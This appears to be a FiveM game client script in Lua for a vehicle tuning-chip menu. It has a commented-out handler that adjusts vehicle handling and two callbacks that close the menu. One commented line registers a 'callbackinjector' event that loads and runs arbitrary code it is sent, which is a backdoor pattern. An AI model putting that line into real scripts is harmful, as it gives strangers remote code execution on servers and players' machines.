-- RegisterNetEvent('nation:applytunnerchip')
-- AddEventHandler('nation:applytunnerchip',function(tunner_customs,vnet)
-- 	if NetworkDoesEntityExistWithNetworkId(vnet) then
-- 		local veh = NetToVeh(vnet)
-- 		if DoesEntityExist(veh) then
-- 			if tunner_customs then
-- 				SetVehicleHandlingFloat(veh, 'CHandlingData', 'fInitialDriveForce', tunner_customs.boost * 1.0)
--         		SetVehicleHandlingFloat(veh, 'CHandlingData', 'fDriveInertia', tunner_customs.fuelmix * 1.0)
--         		SetVehicleEnginePowerMultiplier(veh, tunner_customs.gearchange * 1.0)
--         		SetVehicleHandlingFloat(veh, 'CHandlingData', 'fBrakeBiasFront', tunner_customs.braking * 1.0)
--         		SetVehicleHandlingFloat(veh, 'CHandlingData', 'fDriveBiasFront', tunner_customs.drivebiass * 1.0)
--         		SetVehicleHandlingFloat(veh, 'CHandlingData', 'fBrakeForce', tunner_customs.brakeforce * 1.0)
-- 			end
-- 		end
-- 	end
-- end)

-- TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)

RegisterNUICallback('close',function(data)
	SetVehicleLights(vehicle, 0)
	if (IsHornActive(vehicle)) then StartVehicleHorn(vehicle, 0, 'NORMAL', false); end;
	closeNui()
end)

RegisterNUICallback('voltar',function(data)
	if (IsHornActive(vehicle)) then StartVehicleHorn(vehicle, 0, 'NORMAL', false); end;
end)